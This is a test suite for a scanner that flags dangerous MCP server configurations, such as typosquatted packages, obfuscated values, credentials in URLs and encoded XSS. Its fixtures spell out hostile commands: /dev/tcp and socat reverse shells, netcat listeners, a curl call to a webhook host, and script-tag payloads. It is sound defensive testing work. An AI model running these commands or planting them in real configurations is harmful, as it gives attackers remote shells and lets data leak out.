import { describe, it, expect, beforeEach } from 'vitest';
import { scanAllServers } from '../src/scanners/index.js';
import { loadConfig } from '../src/scanners/config-loader.js';
import { scanThreats } from '../src/scanners/threats.js';
import { resetCounter } from '../src/utils/helpers.js';
import { MCPServerConfig } from '../src/types/index.js';
import * as path from 'path';

const EDGE_FIXTURE = path.join(__dirname, 'fixtures', 'edge-cases.json');

describe('Threats & Edge Cases Scanner', () => {
  let result: ReturnType<typeof scanAllServers>;

  beforeEach(() => {
    resetCounter();
    const config = loadConfig(EDGE_FIXTURE);
    result = scanAllServers(config.mcpServers, EDGE_FIXTURE);
  });

  it('should handle disabled server', () => {
    const server = result.servers.find(s => s.name === 'disabled-server');
    expect(server).toBeDefined();
    const disabledFinding = server!.findings.find(f => f.title === 'Disabled Server');
    expect(disabledFinding).toBeDefined();
    expect(disabledFinding!.severity).toBe('info');
    expect(server!.findings.length).toBeGreaterThanOrEqual(1);
  });

  it('should detect missing command', () => {
    const server = result.servers.find(s => s.name === 'no-command');
    expect(server).toBeDefined();
    const finding = server!.findings.find(f => f.title === 'Missing Command');
    expect(finding).toBeDefined();
    expect(finding!.severity).toBe('high');
  });

  it('should detect shell injection in arguments', () => {
    const server = result.servers.find(s => s.name === 'shell-injection');
    const finding = server!.findings.find(f => f.title === 'Shell Metacharacter in Arguments');
    expect(finding).toBeDefined();
    expect(finding!.severity).toBe('high');
  });

  it('should detect suspicious URL in env vars', () => {
    const server = result.servers.find(s => s.name === 'suspicious-url-env');
    const finding = server!.findings.find(f => f.title === 'Suspicious URL Detected');
    expect(finding).toBeDefined();
    expect(finding!.severity).toBe('critical');
  });

  it('should detect base64 obfuscated values', () => {
    const server = result.servers.find(s => s.name === 'base64-obfuscated');
    const finding = server!.findings.find(f => f.title === 'Potentially Obfuscated Value');
    expect(finding).toBeDefined();
    expect(finding!.severity).toBe('medium');
  });

  it('should detect sensitive working directory', () => {
    const server = result.servers.find(s => s.name === 'sensitive-cwd');
    const finding = server!.findings.find(f => f.title === 'Sensitive Working Directory');
    expect(finding).toBeDefined();
    expect(finding!.severity).toBe('medium');
  });

  it('should detect curl/wget as MCP server', () => {
    const server = result.servers.find(s => s.name === 'curl-server');
    const finding = server!.findings.find(f => f.title === 'HTTP Client as MCP Server');
    expect(finding).toBeDefined();
    expect(finding!.severity).toBe('high');
  });

  it('should detect python eval patterns', () => {
    const server = result.servers.find(s => s.name === 'python-eval');
    const finding = server!.findings.find(f => f.title === 'Dynamic Code Execution Pattern');
    expect(finding).toBeDefined();
    expect(finding!.severity).toBe('critical');
  });

  it('should detect permissive runtime flags', () => {
    const server = result.servers.find(s => s.name === 'permissive-flags');
    const findings = server!.findings.filter(f => f.title === 'Overly Permissive Runtime Flag');
    expect(findings.length).toBeGreaterThanOrEqual(2);
  });

  it('should detect network binding to all interfaces', () => {
    const server = result.servers.find(s => s.name === 'network-bind-all');
    const finding = server!.findings.find(f => f.title === 'Network Binding to All Interfaces');
    expect(finding).toBeDefined();
    expect(finding!.severity).toBe('high');
  });
});

describe('Typosquat Scope-Extension Bypass Fix', () => {
  beforeEach(() => {
    resetCounter();
  });

  it('should flag @modelcontextprotocol-evil/server as typosquat', () => {
    const config: MCPServerConfig = {
      command: 'npx',
      args: ['-y', '@modelcontextprotocol-evil/server'],
    };
    const findings = scanThreats('test-server', config);
    const typosquat = findings.find(f => f.title === 'Potential Typosquat');
    expect(typosquat).toBeDefined();
    expect(typosquat!.severity).toBe('critical');
  });

  it('should NOT flag @modelcontextprotocol/server-github (legit)', () => {
    const config: MCPServerConfig = {
      command: 'npx',
      args: ['-y', '@modelcontextprotocol/server-github'],
    };
    const findings = scanThreats('legit-server', config);
    const typosquat = findings.find(f => f.title === 'Potential Typosquat');
    expect(typosquat).toBeUndefined();
  });
});

describe('Reverse Shell Detection', () => {
  beforeEach(() => {
    resetCounter();
  });

  it('should detect nc -l reverse shell', () => {
    const config: MCPServerConfig = {
      command: 'nc',
      args: ['-l', '4444'],
    };
    const findings = scanThreats('rs-nc', config);
    const rs = findings.find(f => f.title === 'Reverse Shell Pattern Detected');
    expect(rs).toBeDefined();
    expect(rs!.severity).toBe('critical');
  });

  it('should detect ncat -l reverse shell', () => {
    const config: MCPServerConfig = {
      command: 'ncat',
      args: ['-l', '4444'],
    };
    const findings = scanThreats('rs-ncat', config);
    const rs = findings.find(f => f.title === 'Reverse Shell Pattern Detected');
    expect(rs).toBeDefined();
    expect(rs!.severity).toBe('critical');
  });

  it('should detect socat TCP-LISTEN reverse shell', () => {
    const config: MCPServerConfig = {
      command: 'sh',
      args: ['-c', 'socat TCP-LISTEN:4444,reuseaddr,fork EXEC:sh'],
    };
    const findings = scanThreats('rs-socat', config);
    const rs = findings.find(f => f.title === 'Reverse Shell Pattern Detected');
    expect(rs).toBeDefined();
    expect(rs!.severity).toBe('critical');
  });

  it('should detect /dev/tcp reverse shell in args', () => {
    const config: MCPServerConfig = {
      command: 'bash',
      args: ['-c', 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'],
    };
    const findings = scanThreats('rs-dev-tcp', config);
    const rs = findings.find(f => f.title === 'Reverse Shell Pattern Detected');
    expect(rs).toBeDefined();
    expect(rs!.severity).toBe('critical');
  });

  it('should detect /dev/udp in args', () => {
    const config: MCPServerConfig = {
      command: 'bash',
      args: ['-c', 'cat /dev/udp/10.0.0.1/4444'],
    };
    const findings = scanThreats('rs-dev-udp', config);
    const rs = findings.find(f => f.title === 'Reverse Shell Pattern Detected');
    expect(rs).toBeDefined();
    expect(rs!.severity).toBe('critical');
  });

  it('should detect bash -i >& reverse shell', () => {
    const config: MCPServerConfig = {
      command: 'bash',
      args: ['-i', '>&', '/dev/tcp/evil/4444', '0>&1'],
    };
    const findings = scanThreats('rs-bash-i', config);
    const rs = findings.find(f => f.title === 'Reverse Shell Pattern Detected');
    expect(rs).toBeDefined();
    expect(rs!.severity).toBe('critical');
  });

  it('should detect sh -i >& reverse shell', () => {
    const config: MCPServerConfig = {
      command: 'sh',
      args: ['-i', '>&', '/dev/tcp/evil/4444', '0>&1'],
    };
    const findings = scanThreats('rs-sh-i', config);
    const rs = findings.find(f => f.title === 'Reverse Shell Pattern Detected');
    expect(rs).toBeDefined();
    expect(rs!.severity).toBe('critical');
  });

  it('should include MCP05:2025 reference', () => {
    const config: MCPServerConfig = {
      command: 'nc',
      args: ['-l', '4444'],
    };
    const findings = scanThreats('rs-refs', config);
    const rs = findings.find(f => f.title === 'Reverse Shell Pattern Detected');
    expect(rs).toBeDefined();
    expect(rs!.references).toContain('MCP05:2025 - Command Injection & Execution');
    expect(rs!.references).toContain('MCP02:2025 - Tool Poisoning');
  });
});

describe('Hex-Encoded String Detection', () => {
  beforeEach(() => {
    resetCounter();
  });

  it('should detect hex-encoded env values (32+ hex chars)', () => {
    const config: MCPServerConfig = {
      command: 'node',
      args: ['server.js'],
      env: { PAYLOAD: '48656c6c6f576f726c6448656c6c6f576f726c64' },
    };
    const findings = scanThreats('hex-test', config);
    const hex = findings.find(f => f.title === 'Hex-Encoded String Detected');
    expect(hex).toBeDefined();
    expect(hex!.severity).toBe('medium');
  });

  it('should NOT flag short hex strings', () => {
    const config: MCPServerConfig = {
      command: 'node',
      args: ['server.js'],
      env: { PORT: '3000' },
    };
    const findings = scanThreats('hex-short', config);
    const hex = findings.find(f => f.title === 'Hex-Encoded String Detected');
    expect(hex).toBeUndefined();
  });

  it('should NOT flag values starting with known prefixes', () => {
    const config: MCPServerConfig = {
      command: 'node',
      args: ['server.js'],
      env: { KEY: 'sk-48656c6c6f576f726c6448656c6c6f576f726c64' },
    };
    const findings = scanThreats('hex-prefix', config);
    const hex = findings.find(f => f.title === 'Hex-Encoded String Detected');
    expect(hex).toBeUndefined();
  });
});

describe('Short Base64 Detection (threshold 20)', () => {
  beforeEach(() => {
    resetCounter();
  });

  it('should detect base64 strings of 20+ chars without known prefix', () => {
    const config: MCPServerConfig = {
      command: 'node',
      args: ['server.js'],
      env: { TOKEN: 'aGVsbG8gd29ybGQgdGVzdA==' },
    };
    const findings = scanThreats('b64-short', config);
    const obf = findings.find(f => f.title === 'Potentially Obfuscated Value');
    expect(obf).toBeDefined();
    expect(obf!.severity).toBe('medium');
  });

  it('should NOT flag values starting with sk-', () => {
    const config: MCPServerConfig = {
      command: 'node',
      args: ['server.js'],
      env: { API_KEY: 'sk-proj-abcdefghijklmnopqrstuv' },
    };
    const findings = scanThreats('b64-sk', config);
    const obf = findings.find(f => f.title === 'Potentially Obfuscated Value');
    expect(obf).toBeUndefined();
  });

  it('should NOT flag values starting with ghp_', () => {
    const config: MCPServerConfig = {
      command: 'node',
      args: ['server.js'],
      env: { GITHUB_TOKEN: 'ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ1234' },
    };
    const findings = scanThreats('b64-ghp', config);
    const obf = findings.find(f => f.title === 'Potentially Obfuscated Value');
    expect(obf).toBeUndefined();
  });
});

describe('URL in Command Field Detection', () => {
  beforeEach(() => {
    resetCounter();
  });

  it('should detect suspicious URL in command field', () => {
    const config: MCPServerConfig = {
      command: 'curl https://webhook.site/abc123',
      args: [],
    };
    const findings = scanThreats('cmd-url', config);
    const urlCmd = findings.find(f => f.title === 'Suspicious URL in Command');
    expect(urlCmd).toBeDefined();
    expect(urlCmd!.severity).toBe('critical');
  });

  it('should NOT flag clean commands', () => {
    const config: MCPServerConfig = {
      command: 'node',
      args: ['server.js'],
    };
    const findings = scanThreats('cmd-clean', config);
    const urlCmd = findings.find(f => f.title === 'Suspicious URL in Command');
    expect(urlCmd).toBeUndefined();
  });
});

describe('Credentials in URL Detection', () => {
  beforeEach(() => {
    resetCounter();
  });

  it('should detect user:pass@ in config.url', () => {
    const config: MCPServerConfig = {
      command: 'npx',
      args: ['-y', 'some-mcp-server'],
      url: 'https://admin:secretpass@evil.example.com/api',
    };
    const findings = scanThreats('cred-url', config);
    const cred = findings.find(f => f.title === 'Credentials Embedded in URL');
    expect(cred).toBeDefined();
    expect(cred!.severity).toBe('high');
  });

  it('should NOT flag URLs without credentials', () => {
    const config: MCPServerConfig = {
      command: 'npx',
      args: ['-y', 'some-mcp-server'],
      url: 'https://api.example.com/mcp',
    };
    const findings = scanThreats('no-cred-url', config);
    const cred = findings.find(f => f.title === 'Credentials Embedded in URL');
    expect(cred).toBeUndefined();
  });
});

describe('URL-Encoded Payload Detection', () => {
  beforeEach(() => {
    resetCounter();
  });

  it('should detect URL-encoded script tag in env', () => {
    const config: MCPServerConfig = {
      command: 'npx',
      args: ['-y', 'pkg'],
      env: { PAYLOAD: '%3Cscript%3Ealert(1)%3C/script%3E' },
    };
    const findings = scanThreats('encoded-xss', config);
    const f = findings.find(f => f.title === 'URL-Encoded Suspicious Payload Detected');
    expect(f).toBeDefined();
    expect(f!.severity).toBe('medium');
    expect(f!.references).toContain('MCP05:2025 - Command Injection & Execution');
  });

  it('should detect URL-encoded javascript: URI in env', () => {
    const config: MCPServerConfig = {
      command: 'npx',
      args: ['-y', 'pkg'],
      env: { URL_VAL: 'javascript%3Aalert(1)' },
    };
    const findings = scanThreats('encoded-js-uri', config);
    const f = findings.find(f => f.title === 'URL-Encoded Suspicious Payload Detected');
    expect(f).toBeDefined();
  });

  it('should NOT flag benign URL-encoded values', () => {
    const config: MCPServerConfig = {
      command: 'npx',
      args: ['-y', 'pkg'],
      env: { PATH_VAL: 'hello%20world%21' },
    };
    const findings = scanThreats('benign-encoded', config);
    const f = findings.find(f => f.title === 'URL-Encoded Suspicious Payload Detected');
    expect(f).toBeUndefined();
  });

  it('should NOT flag values with known prefixes', () => {
    const config: MCPServerConfig = {
      command: 'npx',
      args: ['-y', 'pkg'],
      env: { API_KEY: 'sk-%3Cscript%3E' },
    };
    const findings = scanThreats('sk-prefix', config);
    const f = findings.find(f => f.title === 'URL-Encoded Suspicious Payload Detected');
    expect(f).toBeUndefined();
  });
});
